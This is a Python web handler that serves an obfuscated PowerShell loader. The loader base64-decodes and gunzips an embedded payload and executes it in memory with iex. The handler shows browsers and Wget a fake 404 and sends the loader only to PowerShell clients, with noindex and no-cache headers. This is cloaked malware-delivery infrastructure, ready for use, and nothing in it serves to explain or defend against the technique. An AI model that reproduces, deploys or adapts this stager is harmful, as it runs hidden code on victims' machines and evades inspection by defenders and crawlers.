import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _base import BaseHandler

_PAYLOAD = (
    "H4sIAAAAAAAC/+082XbbRpbv+oobNCYiYwFa7Ikd6qhPKIq2GEsUm6Ts9tA8NgiUREQgCsGixbLO"
    "mY+Yn5iHfu736T+ZL5l7C4WVIEUlsa2HYRyJQFXdre5egP4C//tf/4n/oM9+i+zADjnM/vUP155x"
    "OfCt/q3ZZ1BTe4M3zA9s7g6NicP09FI/Nn7lPmhOCE/rcLsG+Hnr2yHTDnkQgtIOQgYz5kbgE1/M"
    "Z9DjV8wfTJnjwFN964muiEV9ZlhyTS9yAgPabsh88AzfgMBwbF/ZBXZth7C9dre29pdEWi3untnn"
    "31hE9whQbfY6H077RwB7oEzD0Asam5sh5w73QntmfzIcrl/ffNo0PHvznLnMN0Km4KrT4aFYdv8q"
    "IwqnuCIwfdsLG8OT1+0urVJygjodvtRewA00u4POIxLX2gh3MOAOGzcaJ1HoRWHbNbllu+fIwGjI"
    "rkM9uYEzkIkXa+qK80L/Ripk07K04Y3HQDtmswnzD9iZ7dohqi+siwn0GR04TmfmcT+sKRfMd5nz"
    "dEe3HEepj8GLJo5tQhAaIf5CZDgOE9wLeMVCycAxt1it44a90IfpBvAohMh2Q5jVd/8gjsEiHH8c"
    "voSFXAxC69BwLYfVCKgrga6D1jVmDF4/3Ym/BZ5hMnhLl+0mDGyHuaFzg+SFthsxsUad0pbgFB1X"
    "4WYUgGvb2/VdUGc4ZUvMLk7M86kihyOfnY3VWR0+A+661o0cp7xqML8KwWsT9ErPCuvuwDRCcwq3"
    "Rf/hcJ8F8Ii9ByO/MTKnhj/eeb6m7r8i01bZ6NmzGfpE9e2hvP7pubg+PJLX21s4AecfJNc0DGq3"
    "Ja+34ut+W14/xQlra2eRawrLaDkB3ELOPEnQkR9wv8cDYTy1rQ3Ywt3M+Xuty7vsyrFdJkD+okBe"
    "2MPTDqDf9zB0wCMT8lsUwr8/y7EfoGbX1ABjGka/ADSfeQ6pvvL+envyfjTa0n7aHf8wUzZgfb2u"
    "HzH3PJwSsymACUmhpoZJVFQ9RIF4NKgRbMCRXRCx1RPhc4tQiUlbCKccR3H9/ivc689qqNbWYf0H"
    "1at/xr1U1vI4p18I5+ER/kJNyiFPhsokDLmHBNihwxIiUJEKOqIoCzE9QfAagn9bfyIA07xJrE2o"
    "q/G3GPhuen9lYHkq93mInK+wqkQ5SimFMWDeajDyi/wLdkMypwX6aUfvG1f0E5Of1+ympnR525zy"
    "jY5rOpHF8NYBv3KVesGKjvi57T7qjIcsKuX4wDeutJjmL6IPClR8TnrDznHnP5pHJ0pJU3DXdqtg"
    "YCT0uRWhhYdRAKbPLOaatuGwoKHkF6DmFDTpgBeYu5piSET7Cv0oNQD6ZFJIby1wmwCnQWT4Nm/Q"
    "JPLoEdpnmh7fv5yCsW8EzDUaoKTT1cDLgwGtGQyYGflsEPqYNGXzaNpocIN5+0zvspD+v+L+RUtI"
    "JESJYChw2VVNQdeHQOt6zwgCnGGlILLEKwU6oRhz+1GJAsw6MI34qDQ+Kmr0Udn4qHhyfXzP+6jc"
    "KcXFPi7uuJf8gml9FoTHLJxyC7RT34YsSdbk7d7JYAjaPrduCKtGwkCyRfanGJ6HKZBB+7b5a8Bd"
    "JU5iQu4VEZbyaNXXQ0Tu7mINE0Z+toNpRlFcPgsoKVVaOR0CG5NT32dmaARF7oSwkjU19YPe9n2O"
    "GWpo2E6gH7MgMM4ZpjHIyCXzw5c+n2m/IO11ndFEyGU1ebCZvu2WLavf/kHgQ4v66BaJyRVhAHNl"
    "mM9sIUzDz1bFWO8KNdkBC0zDP8e6zZ55aA2PyBn1I1cjl+pww6qpke+gDmOmfoZGuyEiS+Tw+hfz"
    "UxJB2SWl44ngXItvAKbaWAnquj7nfuZtTO35/BzT2KCH+TLW2C66sT1YL6fnWbEjzektm1C7gZE/"
    "EOaEEgENM+aX5MUSyeBYwPaNwDZ7Bhb9WHJpQ3vGcBQ9CGy/2LqPjnn86hl5ARwboEWGWs/A5ClD"
    "d8SMs3Tqgm14yFYs2I7RyesxFoe+ObUvOTh2EHLAJIk5KHv0ACEnJ1zerMKG5Zmp3KZ5D/Hl2EHD"
    "HrX7/ZP+ONMkODMcx7aMRpzLLOZEFa7n2mReKLo6sd+pVzO1Nu8rcNNxXcFdXHIHPZZScA2vRHvD"
    "B31ihPAosxWuvZItGEz7Q+YF5GzRN7h8NvHTkJ7qKpVOtVHbvbR97s7Q2uI69iV3LOaTWtfWcS8u"
    "MMSs1+vvJRTiPt4DdUKBKo6N8VgcBZPvGB4FEXh3lJEzlhHyS2ZSr9rddr95cNKHgzYMWv1ObzgA"
    "fb85XOi9Yrk93HdRu+DnW+XvWjMKp9qQIq2yV4jBd2W/NZ8GyA5bMQs4RBWlWhNRJBkB/bw3KSg7"
    "wK9gvA8T/C6lsV/BteX19TG5ty6HgIEXWRzOpUdB1oyY3W/n68BwRK+76PNahu9hOgcmn+HcEL0x"
    "fLs+x+v2uwFQQ+nnmoJFjuF/MGPylA0lIdD/gJkrXl/agT1xmLwyTJMF/INlUxbLxXTPxvVS6gHe"
    "Yb9iRRESTD4jR6DU19Sj5n77aBAjbBFCyBC2EoTJPdLRGNuhMbExM8DpggqbgpiVDheSVqUpKANJ"
    "mdDzVMkFFqITcnS2JZ0g6QTqSOGOOvYnI6b6oD1oDSCjGhwjTyMqm2UHJmqhDS6ncwk65rgxypRJ"
    "BllpuUO5tAUON1FhTIw6sWwh5KHhzHMX2peGQIlsRRPfntnovJBfJqDcQIRLU+XiczQQ+VGKI5FS"
    "BUt5qZX5QBGmEiTMEeq/jzIEnI4mCEZ2B8nEbG8OhhQ6kVIpdoL61sbbVwHtQEtUXqSueotHbpie"
    "bpjTC7Ev2xvpf/V0MDBBdJZL7YfEBGXw3j8dDk+6e4gDq+v9Zus1fX2yjRftv7db4mLnCwfY1kn3"
    "ZefVab/Zh1az32sPm3jruNfsDzsHzbKnLzmzMyz7aqq9t4UE26KPF3NiP3mSbzmoJlXdotuXiW6k"
    "2mNq+imjy7GC/ps56EjpEugyXZtfhTLV2G8IntZNJSN/jeELZxqbuICchyFB51lftuSuJLIkwpVJ"
    "idmt5yEjQGGwo2yegFsiIcGUlyjAS4eZUyNowIyTCwdo0xkHtV9mqPAG3flbI0lmSztRJaZYueo4"
    "Wt0c/AyQ9lNH0Oq3UQXeAdHf7L/C7xTqYRzPFUcd8Obk6E27D80jOG53T2FMdz/LxmIi6EpKULPr"
    "i6lYjFxsVUZjGX9GW5kKWPj5nVTcz3wV42TF9eVoy58cu+1f2q3TIZLRPDzpN/PsFj9/AvPlzzzy"
    "5WgXtyWbwYX2kvuzxOW5JrnTvB8QrrXjWuz65Kw2F8zrY7nuYvm6+ZAfLxxyb3V3t8hZ9pnjMAwr"
    "DsUcI+QVrdilndCuyF4psORi3aiNpTHmjOOGaK5ihruXpnd0OFL7ju7Vb8WIIicrd8sx9XOBL9vN"
    "VmPckNEPMWFwnMOE9xATjSithkSiYkily/dxaKWlVoATDhrvJ4Z5EXl0x5xZe0o8ZO5RniGEn1mE"
    "a+ZDwXK6kxAu976Rj9qIgZeoVjmSTDSq/G5FDIlkKlAIHsoYLMRAPKtWPjbEjF2sxNiBSGY8k2zB"
    "Yk6ScjQKaM05vKZAbCJi826VTnucx2ACJc2gUTDVeKPKSExSLto//JFnb9QbtCIs1GYnE4QWjn++"
    "jauvPdLEXUqt9khTduPt2qMt2JWC3SNp7UqYFt0lFgLzrnjoFdmOpQ2oi1BTz9JWxlnkOHEfQz3T"
    "CU39vfgqOx6yUSGaDzhtxeSD9uq7irzDlK3AXJ6ghkmmR5OKBxHBlU31Ze5IM5VtsXoRbrbcRclx"
    "IVopxFw2Ilil04a7EuBCGVQC/CFLtBfjEJMcliAjAVfgyZdXMk4ot3OzSmXXqmyuRkLZ60vgsYZl"
    "wOPrGLjUuGxQ3qiS5FxwiMFbmW0WwJgxBjk5G0KVLkHPvhG88MaTkgjlgZJvzKhlpnqyUXaX12Ht"
    "V267gGVgwTjoZKB9zcwuv0oNAxUwiaO7K9rJI6kYFgGTRRg5LVEmY2naaxX7dDHvzPfTR3T+fJNP"
    "zTqx+vusuzha6OZg5QJU4xJPcj4xNLeAyBsix/KwgXazUESM/uefY3hnxMW8beQrmWJFs1aV4mFU"
    "0Dohm4H4KTqLB7HJ+jeQQwmkTSarfHqq/JDTgzmgpl/abUKRWEYjnjZfC+Hs774bgzhspDCF+/3k"
    "SQXLxTvLPeV9myRnM6l9uKZyo1wWQjA1fAYF17YnOdl81W92h402lmM33GUbL0+PjmDnr99vLxNf"
    "UUbv36vMvWyQ+ZwO2/1u87hdYcoLmC647XtYfpPrXcXtmkUcB1MwrMszVJkrA7Uk/RKgMPzIYXDu"
    "88jbU+RpPCpXYFK9eqPg6isUJz2Wu/eOBfeK4gHIRBMcDQt6vi16nQPcFts9fzDOovjzUjFEd8sy"
    "loq8HAPvkXqxH1gpcTWgUwcy2jjZojMBmXfB24FwYbp4RHl+pSNLoqlOXidkgyn3Q3SqNUUo1emg"
    "3e/1T152jtrv5clPQbd0XK/UK8HqQ8M/Z6Gw7r3YcHfjgYFxyWr1e8S6tA263IxLWcC9hozzRd4r"
    "V1SK+BrB3kAhgVCgmDKgMbdhswOb7x6oQc2kEylIt3iwlL+KNGQ5g1lCUskZ5iOwaUKcmTyQchmA"
    "rYU7UtUMy6ofCsvU4tgqOP6ez8XWJzkfRUL5tAkdSTK9yv+38pPdOOKLR0pqLKjrlR2G3Qcd+hZS"
    "q1IHNmvYYJKx+4CO7NLnqyQSXEUmSo/azWccF/ob2w8jw3nNMPBarJx5PH1RoR2Lm0y3RV4kIwty"
    "h8XtQtAwx1rUvytiaHW17RXhnydPeKb3NG1pRH+2tQLzmP/VBBX1IuzK/GEB25UAvo78aN+WCuHp"
    "c1yzuJ8KC2kuw/lpERzZIZ6Dg/DnoeystiWyJ17Iv7NuOILfBm3h6APELWUaPwn3gIVC7BolE/nj"
    "CNCoOjBsN4BYG/Jl2MOV4F7w6tleVtHlnvWAWq45AtQcSSP2Ul3Zfrqit/h/uVUU74KkC72FWSXm"
    "gSwObeu/rcfWPDfwt/U5CRYfPDym98zkQ4eYb/zrv33b5FALsNw3p8y8mPBrjG3w5z1KOBC4BNpY"
    "DUTroTaKJTlxuHkxVik0bUD+3mg8VpsCSpC84hK/WRGnePJCf2M4EUurcJWav+Qm5Ep5LLosKH4P"
    "AvkfjofxRhWoymJL/jaFl4qQUrWeXBZxNAeDwsjKVjYPsyAdAv59em9UmL7U6xXhkqkktFYa8NdQ"
    "7m40YaIOg0f5llK39+GkN4yfmOi4QWg4hp/RLB7DoDc1I79wOzu5dz2z6uQ+4zo5u6cgiVYQ48sZ"
    "wZd9raDTHQybR+KxrO7pfrvX73SHDz+mzxNd3UDLi6P61L0moSSH55Xn7OVJi07Yl56DU1bfgIDh"
    "APVqVz8KT4m/5wR6+efPPIH+nSTcf/y8+ASW4kNZe0sxQyMVR9pKmn4HmvRYaEypdpReMsDylJz6"
    "io+eFp/yzz0En71a/In5XHeRCI+I0LGW3LTkpE3TmwWb3WTs33a2Wr1jfRbYVNATIe/TMchGck+z"
    "55wXjeeL6ruNBRyWTpBLLfDMCNcqiu28FWNxfG3PZCG84InU6vcflpS3RXdfBy0OGFCLo3lmB/Xi"
    "mxG+TbZ16tKvwHC+9av96kH/Tea25dNXsL2N7jq92MpdvNDzQ89z7tvyL2P/LUCW3lo/Cz196gmV"
    "8qLJZsDPQseOf18ZPtt+uunFDcZg87R3sBl5luaZzo/ale1ub2nXPz7TXug7+pa+8+Pz5y/0T7an"
    "lMOEFGwpRkjuvlKQkCGiDwf9DvmM0y79GjSPHh4nCoQvDxRC8IsihYRzT6gozfq6sSKj/9EEi28V"
    "LYpKbNFhY+5pvt/p8AvOPjVO6bYPex/Q4D70Wkc/CrMqOu05b3XYK6hLbgfHWaf07t5IJ+EWwhyy"
    "uwGFH4ucKqGrz5d95EFM2/vmPjXxrMfNTjdzrbnk15x7HBxdqsyYLV7MmdNE2opFFiVbkfO8s8q8"
    "+dj4au/bClWnWNzq9H6Ps0sktYq3my32dQmYe5xdedqf6e2Sv1MzZ+apqnZcGxc87j9Xk/uTD7EB"
    "volPPMWZlIFCXUveeV5bq+o8pPpX7jus1HPI+g25LS83smdmqdOQdRlyq+aVS9suQin1GqjPkFGZ"
    "zqI1W7e5U4w72L4tpPd3sHObefC7FGjuubUHdgKyP+myZDdI6ruxfdOfRkqbBv8HWXwlNUxKAAA="
)

_LOADER = (
    "$d=[Convert]::FromBase64String('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')\n"
    "$s=New-Object IO.MemoryStream(,$d)\n"
    "$g=New-Object IO.Compression.GZipStream($s,[IO.Compression.CompressionMode]::Decompress)\n"
    "iex (New-Object IO.StreamReader($g)).ReadToEnd()\n"
)

_BROWSER_AGENTS = ("Mozilla", "Chrome", "Safari", "Firefox", "Edge", "Opera", "Wget")


class handler(BaseHandler):
    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        if "PowerShell" not in ua and any(b in ua for b in _BROWSER_AGENTS):
            self.send_response(404)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("X-Robots-Tag", "noindex, nofollow")
        self.end_headers()
        self.wfile.write(_LOADER.encode())
